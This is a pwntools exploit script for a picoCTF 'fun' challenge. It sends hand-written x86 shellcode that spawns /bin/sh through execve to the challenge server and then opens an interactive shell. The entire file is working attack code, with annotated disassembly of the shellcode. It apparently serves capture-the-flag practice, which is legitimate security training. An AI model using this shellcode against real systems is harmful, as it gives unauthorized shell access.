#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h", "-F", "#{paneid}", "-P"]
exe = ELF("./fun_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = gdb.debug([exe.path])
        # r = process([exe.path])
    else:
        r = remote("mercury.picoctf.net", 16610)

    return r


def main():
    r = conn()

    # good luck pwning :)
    # SHELLCODE:
    # 0:  31 c0                   xor    eax,eax
    # 2:  50                      push   eax
    # 3:  90                      nop
    # 4:  b0 73                   mov    al,0x73
    # 6:  b4 68                   mov    ah,0x68
    # 8:  66 50                   push   ax
    # a:  b0 2f                   mov    al,0x2f
    # c:  b4 2f                   mov    ah,0x2f
    # e:  66 50                   push   ax
    # 10: b0 69                   mov    al,0x69
    # 12: b4 6e                   mov    ah,0x6e
    # 14: 66 50                   push   ax
    # 16: b0 2f                   mov    al,0x2f
    # 18: b4 62                   mov    ah,0x62
    # 1a: 66 50                   push   ax
    # 1c: 31 c0                   xor    eax,eax
    # 1e: 89 e3                   mov    ebx,esp
    # 20: 50                      push   eax
    # 21: 90                      nop
    # 22: 89 e1                   mov    ecx,esp
    # 24: 89 ca                   mov    edx,ecx
    # 26: b0 0b                   mov    al,0xb
    # 28: cd 80                   int    0x80
    shellcode = b"\x31\xC0\x50\x90\xB0\x73\xB4\x68\x66\x50\xB0\x2F\xB4\x2F\x66\x50\xB0\x69\xB4\x6E\x66\x50\xB0\x2F\xB4\x62\x66\x50\x31\xC0\x89\xE3\x50\x90\x89\xE1\x89\xCA\xB0\x0B\xCD\x80"
    modified_shellcode = b""
    pointer = 0
    i = 0
    while pointer < len(shellcode):
        info(f"{hex(shellcode[pointer:pointer + 1][0])=}")
        modified_shellcode += shellcode[pointer:pointer + 1]
        pointer += 1
        i += 1

    info(f"{modified_shellcode=}")

    print(r.recvline().decode().strip())
    info("sending shellcode")
    r.sendline(modified_shellcode)

    r.interactive()


if __name__ == "__main__":
    main()
